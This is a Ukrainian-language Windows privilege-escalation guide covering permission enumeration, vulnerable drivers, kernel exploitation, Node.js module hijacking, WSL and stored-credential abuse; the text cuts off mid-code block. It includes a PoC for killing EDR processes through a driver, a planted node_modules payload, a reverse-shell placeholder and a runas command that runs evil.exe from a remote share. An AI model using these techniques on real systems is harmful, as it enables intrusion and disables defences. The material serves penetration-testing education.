Необов’язковий Windows Driver Kit містить `StandaloneRunner.exe`, який може використовувати файли `command.txt`, `reboot.rsf` і файл проєкту `working\rsf.rsf` зі свого каталогу запуску. Заплановане завдання або служба, що запускає цей помічник з обліковим записом із підвищеними привілеями, може перетворити доступ на запис із низькими привілеями до цих вхідних файлів на виконання команд у контексті цього облікового запису, навіть якщо виконуваний файл помічника захищений. Переконайтеся, що споживач має підвищені привілеї та що **обидва** додаткові файли можна створити або змінити; самого виявлення помічника недостатньо.

Для запланованого завдання перевірте [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) його дії та ACL обох додаткових шляхів до файлів. Якщо в завданні не вказано робочий каталог, каталог виконуваного файлу є лише зачіпкою для перевірки, а не доказом того, звідки завдання читає вхідні файли. Також має виконуватися вимога щодо файлу проєкту. Перевірте фактичний principal завдання, а не припускайте, що воно запускається від SYSTEM.

## Застосунки

### Встановлені застосунки

Перевірте **дозволи на бінарні файли** (можливо, ви зможете замінити один із них і підвищити привілеї) та на **папки** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Шлях відновлення агента Checkmk для Windows

[CVE-2024-0670](https://checkmk.com/werk/16361) стосується старіших агентів Checkmk для Windows, які записували файли команд у `C:\Windows\Temp`, а потім виконували наявний файл, захищений від запису, якщо заміна не вдавалася. Постачальник виправив проблему у версіях 2.1.0p40, 2.2.0p23, 2.3.0b1 і 2.4.0b1. Перевірте повний рівень встановлених виправлень і чи може виконуватися уражена операція агента; позначення лише гілки, наприклад `2.1`, не дає змоги встановити наявність уразливості. Під час переліку можна перевірити версію, стан служби та дозволи для Temp, не створюючи файлів і не запускаючи команди агента.

#### Перевірка служби ADSelfService Plus SAML

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) стосувалася ADSelfService Plus збірки 6210 і попередніх; постачальник виправив її у збірці 6211. Вона має значення лише якщо SAML SSO **увімкнено або було ввімкнено**. Тому запис про встановлений продукт або шлях до служби — це зачіпка, а не висновок про наявність уразливості: перевірте точну збірку, історію конфігурації SAML, доступність служби з мережі та обліковий запис, від імені якого вона працює. Виконання коду через службу успадковує привілеї цього облікового запису; виконання від імені SYSTEM можливе лише для екземпляра, що працює від імені SYSTEM. Файл `OfflineBackup_*.ezip`, доступний для читання в каталозі Backup продукту, — це окрема зачіпка щодо зашифрованої резервної копії, а не доказ наявності придатних до використання облікових даних чи цієї вади SAML. Під час звичайного переліку зафіксуйте його шлях і права доступу, не розпаковуючи файл.

#### Межі повноважень контролера Jenkins і доменного облікового запису

На контролері Jenkins під Windows розрізняйте дозвіл на створення або налаштування завдання та дозвіл на його запуск: [Jenkins визначає їх як окремі права `Job/Create`, `Job/Configure` і `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Налаштований розклад або віддалений тригер можуть забезпечити інший спосіб запуску збірки, але перевірте, чи ввімкнено його та чи збірка справді запускається. Код виконується від імені контролера або вибраного агента, а збережені облікові дані можна використати лише за умови, що завдання має доступ до їхньої області дії. Окремо перевірте доступ до метаданих `JENKINS_HOME`: Jenkins зберігає облікові дані та ключі шифрування у `credentials.xml`, `secrets/hudson.util.Secret` і `secrets/master.key` ([зберігання секретів Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Сама наявність цих файлів не розкриває пароль; перевірте **доступ на читання до необхідних файлів** і наявність окремого шляху повторного використання облікового запису, не виводячи секрети у спільний вивід. Якщо цей обліковий запис має право запису до атрибута `scriptPath` об’єкта користувача AD, перевірте, чи можна записувати у вказаний шлях скрипту та чи існує реальний механізм входу або запланований процес, що використовує цей шлях і працює від імені цільового користувача, перш ніж вважати це виконанням від імені іншого користувача. Для керування додатковими групами необхідно окремо підтвердити фактичні ефективні права AD.

#### Ідентичність агента Azure Pipelines із власним хостингом

Для проєкту Azure DevOps Server або Azure Pipelines розрізняйте дозвіл **створювати або редагувати** pipeline та дозвіл **ставити його в чергу** й використовувати вибраний пул агентів; [Microsoft окремо описує дозволи pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) і [авторизацію пулу](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Якщо обліковий запис із нижчими привілеями може надіслати крок зі скриптом і запустити цей pipeline на агенті Windows із власним хостингом, крок виконується від імені [налаштованого для агента облікового запису операційної системи](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Перш ніж заявляти про перехід між обліковими записами або отримання прав SYSTEM, перевірте конкретний pipeline, обмеження гілок і ресурсів, авторизований пул, завдання, яке можна запустити, та ідентичність служби агента. Сам факт встановлення агента, наявність ролі в проєкті або права запису до репозиторію — лише зачіпка; під час пасивного переліку перевіряйте дозволи та локальні метадані служби, не запускаючи збірку.

#### Облікові дані Microsoft Entra Connect Sync

[Microsoft розрізняє](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **обліковий запис служби ADSync**, від імені якого працює служба синхронізації та який отримує доступ до бази даних SQL, і **обліковий запис конектора AD DS**, права якого в каталозі залежать від налаштованих функцій синхронізації. Облікові дані конектора зберігаються в цій базі даних у зашифрованому вигляді, а ключовий матеріал [захищено за допомогою DPAPI від імені облікового запису служби ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Сам факт наявності служби синхронізації, локальної групи, назва якої натякає на права адміністратора, або доступу до бази даних не підтверджує можливість розшифрувати облікові дані чи підвищити права в домені. Окремо перевірте фактичні права на читання бази даних, доступ служби до облікового запису та ключів, структуру встановлення й SQL, налаштовану ідентичність конектора та ефективні привілеї цієї ідентичності в AD. Під час звичайного переліку показуйте лише метадані служби й доступу; не виконуйте запити до збережених секретів і не виводьте їх.

#### Дозволи для DLL підтримки драйвера принтера

Встановлений драйвер принтера може зберігати DLL підтримки у `C:\ProgramData` і завантажувати їх у привілейованому процесі друку. Перевірте ACL точного каталогу драйвера та DLL, зокрема батьківських каталогів і точок повторної обробки, навіть якщо перелік принтерів через WMI заборонено. Для [проблеми драйвера принтера Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) вказаний шлях був `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [первинний опис](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) розповідає про завантаження DLL процесом `PrintIsolationHost.exe`. ACL із правом запису — лише зачіпка: перевірте ефективний доступ на запис з урахуванням записів заборони, чи встановлено відповідний драйвер і чи завантажує він файл із привілейованою ідентичністю, а також чи виправив постачальник цю проблему в оновленому драйвері або програмі безпеки. Не робіть висновок про наявність уразливості лише за назвою каталогу або версією драйвера.

### Дозволи на запис

Перевірте, чи можете ви змінити якийсь файл конфігурації, щоб прочитати спеціальний файл, або змінити двійковий файл, який буде виконано від імені облікового запису Administrator (schedtasks).

Щоб знайти слабкі дозволи для папок і файлів у системі, виконайте:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Автозавантаження плагінів Notepad++: закріплення/виконання

Notepad++ автоматично завантажує будь-яку DLL плагіна з підпапок `plugins`. Якщо доступна для запису портативна/копійована інсталяція, розміщення шкідливого плагіна забезпечує автоматичне виконання коду в `notepad++.exe` під час кожного запуску (зокрема, з `DllMain` і callback-функцій плагінів).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Запуск під час завантаження системи

**Перевірте, чи можете ви перезаписати якийсь розділ реєстру або бінарний файл, який запускатиме інший користувач.**\
**Прочитайте** **цю сторінку**, щоб дізнатися більше про цікаві **місця autoruns для підвищення привілеїв**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Драйвери

Шукайте потенційно **сторонні підозрілі/вразливі** драйвери

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Якщо драйвер надає примітив довільного читання/запису в ядрі (поширене явище в погано спроєктованих обробниках IOCTL), можна підвищити привілеї, безпосередньо викравши токен SYSTEM із пам’яті ядра.<sup>[[13]](#references)</sup> Покрокову техніку дивіться тут:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Для помилок race condition, коли вразливий виклик відкриває шлях Object Manager, можна навмисно сповільнити пошук (використовуючи компоненти максимальної довжини або глибокі ланцюжки каталогів), щоб збільшити часовий проміжок із мікросекунд до десятків мікросекунд:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### UAF у cancel-safe queue, витоки даних із paged-pool і переходи до I/O ring

Деякі ланцюжки Windows kernel LPE можна побудувати на двох окремо слабких помилках: **race condition життєвого циклу cancel-safe queue**, через яку запит/CBD звільняється, поки блокування черги ще утримується, і витоку даних через **звільнення блокування перед копіюванням**, який розкриває звільнений розподіл paged-pool під час `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Нотатки щодо аудиту та експлуатації:

- **Звільнення під блокуванням + подальше скасування**: шукайте шлях успішного виконання з послідовністю **Acquire -> CompleteRequest/free -> Release**, тоді як шлях скасування виконує **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Якщо шлях успішного виконання доходить до `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` до звільнення блокування CBDQ/CSQ, потік, заблокований у `NtCancelIoFileEx -> IopCsqCancelRoutine`, може відновити виконання пізніше й передати звільнений `PFLT_CALLBACK_DATA` назад у callback-драйвера для видалення.
- **Повторно використайте звільнений об’єкт черги**, виділивши розподіл paged-pool такого самого розміру, контрольований атакувальником. Записи Data Queue Entries у `NPFS` корисні, оскільки вміст і розмір можна контролювати, а згодом перевіряти за допомогою операцій читання/перегляду pipe. Якщо звільнений об’єкт містить вбудовані посилання списку, перезапишіть їх **циклічним списком фальшивих вузлів запитів у пам’яті користувача**, щоб драйвер повторно обробляв визначені атакувальником структури запитів, а не зупинявся на початковій голові списку.
- **Покращіть передбачуваний запис**: якщо фальшивий запит перенаправляє вкладений вказівник контексту, що використовується для записів обліку (мітки часу / QPC / поля поруч із лічильником посилань), можна отримати **запис у контрольовану адресу, але з неконтрольованим значенням**. У такому разі націльтеся на поле **length/size** об’єкта розпиленого пулу замість кінцевого вказівника на код/дані, а потім переберіть розпилені об’єкти, доки пошкоджений об’єкт не дасть змогу виконати **читання paged-pool за межами буфера**.
- **Шаблон витоку, придатний для race condition**: будь-який системний виклик із кодом `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` — хороший кандидат. Надійність підвищується, якщо атакувальник може збільшити буфер, що копіюється (наприклад, додавши багато записів списку/ресурсів, які збільшують кінцевий розмір виділення серіалізатора), оскільки довше копіювання розширює вік для заміни, не обов’язково спричиняючи аварійне завершення системи.
- **Цілі для повторного заповнення, багаті на вказівники**: масиви зареєстрованих буферів Windows **I/O ring** — чудові цілі для витоку, оскільки їхній розмір у paged-pool контролюється атакувальником (`8 * regBufferCnt`), а кожен елемент є вказівником ядра на `_IOP_MC_BUFFER_ENTRY`. Витечіть один із цих масивів, відновіть навколишній `IORING_OBJECT`, а потім пошкодьте **`RegBuffers`** і **`RegBuffersCount`**, щоб наступні операції I/O ring використовували підроблені атакувальником записи й надавали довільне читання/запис у ядрі. Якщо єдиний доступний запис дає стабільний байт (наприклад, із `KUSER_SHARED_DATA+0x14`), використайте **перекривні невирівняні записи**, щоб створити вказівник користувача з повторюваними байтами, наприклад `0x0101010101010101`, відобразіть його за допомогою `VirtualAlloc` і розмістіть там підроблений масив зареєстрованих буферів.<sup>[[30]](#references)</sup>

Корисні індикатори для налагодження:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Щойно отримаєте довільне читання/запис ядра через пошкоджене кільце I/O, викрадіть токен SYSTEM за допомогою стандартного workflow після отримання примітива:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Примітиви пошкодження пам’яті куща реєстру

Сучасні вразливості кущів реєстру дають змогу формувати детерміновані розкладки пам’яті, зловживати доступними для запису нащадками HKLM/HKU і перетворювати пошкодження метаданих на переповнення kernel paged pool без власного драйвера. Повний ланцюжок описано тут:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Плутанина типів у прямому режимі `RtlQueryRegistryValues` через шляхи, контрольовані зловмисником

Деякі драйвери приймають шлях до реєстру з userland, перевіряють лише те, що це коректний рядок UTF-16, а потім викликають `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` із `RTL_QUERY_REGISTRY_DIRECT` для запису в скалярне значення стека, наприклад `int readValue`. Якщо відсутній `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` інтерпретується відповідно до **фактичного** типу реєстру, а не того, який очікував розробник.

Це створює два корисні примітиви:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: контрольований користувачем абсолютний шлях `\Registry\...` дає змогу драйверу запитувати вибрані зловмисником ключі, розкривати їхню наявність через коди повернення/журнали, а іноді й читати значення, до яких викликач не мав би прямого доступу.
- **Пошкодження пам’яті ядра**: скалярне призначення, наприклад `&readValue`, може стати об’єктом плутанини типів і трактуватися як `REG_QWORD`, `UNICODE_STRING` або буфер бінарних даних заданого розміру — залежно від типу значення реєстру.

Практичні нотатки щодо експлуатації:

- **Захист у Windows 8+**: якщо запит звертається до **недовіреного куща** з `RTL_QUERY_REGISTRY_DIRECT`, але без `RTL_QUERY_REGISTRY_TYPECHECK`, виклики з ядра призводять до аварійного завершення з `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Щоб зберегти можливість експлуатації, шукайте **доступні зловмиснику для запису ключі всередині довірених системних кущів**, а не створюйте значення в `HKCU`.
- **Розміщення даних у довіреному кущі**: скористайтеся NtObjectManager, щоб перелічити нащадків `\Registry\Machine`, доступних для запису, а потім повторіть сканування з дубльованим токеном **низького рівня цілісності**, щоб знайти ключі, доступні з ізольованих контекстів:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: прямий запис 8 байтів у 4-байтовий `int` пошкоджує сусідні дані стека й може частково перезаписати сусідній callback/function pointer.
- **`REG_SZ` / `REG_EXPAND_SZ`**: прямий режим очікує, що `EntryContext` вказує на `UNICODE_STRING`. Якщо код спочатку завантажує контрольований зловмисником `REG_DWORD` у скаляр на стеку, а потім повторно використовує той самий буфер для читання рядка, зловмисник контролює `Length`/`MaximumLength` і частково впливає на вказівник `Buffer`, що дає напівконтрольований запис у kernel.
- **`REG_BINARY`**: для великих двійкових даних прямий режим трактує перший `LONG` за адресою `EntryContext` як знаковий розмір буфера. Якщо попереднє читання `REG_DWORD` залишає в повторно використаному скалярі **від’ємне** контрольоване зловмисником значення, наступний запит `REG_BINARY` копіює байти зловмисника безпосередньо в сусідні слоти стека, що часто є найпростішим способом повністю перезаписати callback pointer.

Ефективний шаблон для пошуку: **читання різнотипних значень реєстру в ту саму змінну на стеку без її повторної ініціалізації**. Шукайте `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, повторно використані вказівники `EntryContext` і шляхи виконання, у яких перше читання з реєстру визначає, чи відбудеться друге.

#### Зловживання відсутністю FILE_DEVICE_SECURE_OPEN в об’єктах пристроїв (LPE + знищення EDR)

Деякі підписані драйвери сторонніх розробників створюють об’єкт пристрою зі строгим SDDL за допомогою IoCreateDeviceSecure, але забувають задати FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього прапорця захищений DACL не застосовується, коли пристрій відкривають через шлях із додатковим компонентом, що дає будь-якому непривілейованому користувачу змогу отримати handle, використавши шлях простору імен на кшталт:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (з реального випадку)

Отримавши змогу відкрити пристрій, користувач може зловживати привілейованими IOCTL, які надає драйвер, для LPE і втручання в роботу системи. Приклади можливостей, помічених на практиці:
- Повертати handle з повним доступом до довільних процесів (крадіжка токенів / оболонка SYSTEM через DuplicateTokenEx/CreateProcessAsUser).
- Необмежене читання/запис сирого диска (втручання в дані офлайн, трюки з персистентністю під час завантаження).
- Завершувати довільні процеси, зокрема Protected Process/Light (PP/PPL), що дає змогу знищувати AV/EDR із user land через kernel.

Мінімальний шаблон PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Пом’якшення для розробників
- Завжди встановлюйте FILE_DEVICE_SECURE_OPEN під час створення об’єктів пристроїв, доступ до яких має обмежуватися DACL.
- Перевіряйте контекст виклику для привілейованих операцій. Додавайте перевірки PP/PPL перед дозволом на завершення процесу або повернення дескрипторів.
- Обмежуйте IOCTL (маски доступу, METHOD_*, перевірка вхідних даних) і розгляньте моделі з брокером замість прямого доступу до привілеїв ядра.

Ідеї для виявлення для захисників
- Відстежуйте відкриття з user-mode підозрілих імен пристроїв (наприклад, \\ .\\amsdk*) і певні послідовності IOCTL, що можуть свідчити про зловживання.
- Застосовуйте список заблокованих вразливих драйверів Microsoft (HVCI/WDAC/Smart App Control) і ведіть власні списки дозволених/заборонених драйверів.


## PATH DLL Hijacking

Якщо у вас є **права на запис у папку, що входить до PATH**, ви можете перехопити DLL, завантажувану процесом, і **підвищити привілеї**.<sup>[[2]](#references)</sup>

Перевірте дозволи для всіх папок у PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Щоб дізнатися більше про те, як зловживати цією перевіркою:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Перехоплення розв’язання модулів Node.js / Electron через `C:\node_modules`

Це варіант **неконтрольованого шляху пошуку у Windows**, який впливає на програми **Node.js** і **Electron**, коли вони виконують імпорт без зазначення шляху, наприклад `require("foo")`, а очікуваний модуль **відсутній**.<sup>[[20]](#references)</sup>

Node шукає пакети, піднімаючись деревом каталогів і перевіряючи папки `node_modules` у кожному батьківському каталозі. У Windows цей пошук може дійти до кореня диска, тож програма, запущена з `C:\Users\Administrator\project\app.js`, може перевірити такі шляхи:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Якщо **користувач із низькими привілеями** може створити `C:\node_modules`, він може розмістити там шкідливий `foo.js` (або папку пакета) і дочекатися, поки **процес Node/Electron із вищими привілеями** спробує знайти відсутню залежність. Payload виконається в контексті безпеки процесу-жертви, тож це стає **LPE**, якщо ціль працює від імені адміністратора, із підвищеними привілеями як заплановане завдання/обгортка служби або як привілейована настільна програма з автозапуском.

Таке особливо часто трапляється, коли:

- залежність указана в `optionalDependencies`<sup>[[22]](#references)</sup>
- стороння бібліотека обгортає `require("foo")` у `try/catch` і продовжує роботу в разі помилки
- пакет видалили зі збірок для production, не включили під час пакування або не вдалося встановити
- вразливий `require()` розташований глибоко в дереві залежностей, а не в коді основної програми

### Пошук вразливих цілей

Використовуйте **Procmon**, щоб підтвердити шлях розв’язання модулів:<sup>[[23]](#references)</sup>

- Встановіть фільтр `Process Name` = виконуваний файл цільового процесу (`node.exe`, EXE-файл програми Electron або процес-обгортка)
- Встановіть фільтр `Path` `contains` `node_modules`
- Зверніть увагу на `NAME NOT FOUND` і останнє успішне відкриття файлу в `C:\node_modules`

Корисні шаблони для аналізу коду в розпакованих файлах `.asar` або вихідному коді програм:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Експлуатація

1. Визначте **назву відсутнього пакета** за допомогою Procmon або аналізу вихідного коду.
2. Створіть кореневий каталог пошуку, якщо його ще немає:

```powershell
mkdir C:\node_modules
```

3. Розмістіть модуль із точно очікуваною назвою:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Запустіть застосунок-жертву. Якщо застосунок спробує виконати `require("foo")`, а легітимний модуль відсутній, Node може завантажити `C:\node_modules\foo.js`.

Реальні приклади відсутніх необов’язкових модулів, які відповідають цьому шаблону, — `bluebird` і `utf-8-validate`, але **техніка** є універсальною: знайдіть будь-який **відсутній bare import**, який привілейований процес Windows на Node/Electron спробує знайти.

### Ідеї для виявлення та захисту

- Створіть сповіщення, коли користувач створює `C:\node_modules` або записує туди нові файли чи пакети `.js`.
- Шукайте процеси з високим рівнем цілісності, які читають дані з `C:\node_modules\*`.
- Додавайте всі залежності середовища виконання до production-збірки та перевіряйте використання `optionalDependencies`.
- Перевіряйте сторонній код на наявність шаблонів `try { require("...") } catch {}`, які не повідомляють про помилки.
- Вимикайте необов’язкові перевірки, якщо бібліотека це підтримує (наприклад, деякі розгортання `ws` можуть уникнути застарілої перевірки `utf-8-validate`, задавши `WS_NO_UTF_8_VALIDATE=1`).

## Мережа

### Спільні ресурси

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### файл hosts

Перевірте, чи жорстко прописані у файлі hosts інші відомі комп’ютери.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Мережеві інтерфейси та DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Відкриті порти

Перевірте наявність **обмежених служб** ззовні.

```bash
netstat -ano #Opened ports?
```

Для локального listener зіставте його PID із власником процесу, шляхом до виконуваного файла та службою або запланованим завданням, яке його запускає. Служба віддаленого керування може надати доступ від імені користувача робочого столу лише за умови, що це дозволяють її автентифікація та засоби керування командами. Окремо перевірте власну TCP-програму, що працює від імені облікового запису з вищими привілеями: listener і шлях до бінарного файла — це лише пасивні зачіпки, тоді як для підтвердження автентифікованого способу експлуатації пошкодження пам’яті потрібно проаналізувати саме цей бінарний файл і доступні для нього вхідні дані. Якщо схоже, що відкритий порт належить системному процесу, перш ніж визначати службу на кінцевому вузлі, зіставте його з [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface); саме правило перенаправлення не доводить, що кінцевий вузол доступний або вразливий.

### Таблиця маршрутизації

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Таблиця ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Правила брандмауера

[**Перегляньте цю сторінку, щоб дізнатися про команди для роботи з брандмауером**](../basic-cmd-for-pentesters.md#firewall) **(перегляд правил, створення правил, вимкнення, вимкнення...)**

Більше[ команд для мережевої розвідки тут](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Двійковий файл `bash.exe` також можна знайти в `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Якщо ви отримаєте права користувача root, то зможете прослуховувати будь-який порт (під час першої спроби прослуховувати порт за допомогою `nc.exe` у графічному інтерфейсі з’явиться запит, чи дозволити `nc` працювати через брандмауер).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Щоб легко запускати bash від імені root, можна спробувати `--default-user root`

Файлову систему `WSL` можна переглянути в папці `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Права `Linux`-користувача `root` у `WSL` самі по собі не надають прав адміністратора Windows. Якщо поточний обліковий запис Windows має доступ до файлової системи дистрибутива, перегляньте файли історії команд оболонки (зокрема `/root/.bash_history`) на наявність команд, у яких могли зберегтися облікові дані; для підвищення привілеїв усе одно потрібен дійсний обліковий запис із вищими привілеями та дозволений спосіб автентифікації. Структура `LocalState\rootfs` використовується в старіших інсталяціях WSL; у WSL 2 дистрибутив зазвичай зберігається на віртуальному диску [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), тож спочатку визначте фактичний дистрибутив і шлях до його сховища. Уникайте виведення вмісту історії команд під час автоматизованого збору даних.

## Облікові дані Windows

### Облікові дані Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Вважайте `DefaultUserName` і `DefaultDomainName` контекстом облікового запису, а не обліковими даними. Непорожнє значення `DefaultPassword` або `AltDefaultPassword` є знахідкою з відкритим паролем у реєстрі. Якщо `AutoAdminLogon=1`, але пароль у відкритому вигляді прочитати не вдається, це лише зачіпка: [Sysinternals Autologon може зберігати пароль як секрет LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), а звичайне читання реєстру не дає змоги встановити, чи існує цей секрет і чи можна його отримати. Перш ніж повідомляти про витік облікових даних, перевірте права доступу та фактичну конфігурацію входу.

### Диспетчер облікових даних / Windows vault

З [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault зберігає облікові дані для серверів, вебсайтів та інших програм, які **Windows** може використовувати, щоб **автоматично входити в облікові записи користувачів**. Спершу може здатися, що користувачі можуть зберігати облікові дані для таких сайтів, як Facebook, Twitter чи Gmail, і налаштовувати автоматичний вхід через браузери, але це працює не так.

Windows Vault зберігає облікові дані, за допомогою яких Windows може автоматично входити в облікові записи користувачів. Це означає, що будь-яка **програма Windows, якій потрібні облікові дані для доступу до ресурсу** (сервера або вебсайту), **може використовувати цей Диспетчер облікових даних** і Windows Vault та застосовувати надані облікові дані, замість того щоб користувачі щоразу вводили ім’я користувача й пароль.

Якщо програми не взаємодіють із Диспетчером облікових даних, гадаю, вони не можуть використовувати облікові дані для певного ресурсу. Тож якщо ваша програма хоче використовувати сховище, вона має певним чином **взаємодіяти з Диспетчером облікових даних і запитувати облікові дані для цього ресурсу** зі сховища за замовчуванням.

Використайте `cmdkey`, щоб переглянути список збережених на комп’ютері облікових даних.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Тоді можна використовувати `runas` з параметром `/savecred`, щоб скористатися збереженими обліковими даними. У наступному прикладі викликається віддалений бінарний файл через SMB-ресурс.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Використання `runas` із наданим набором облікових даних.

```bash
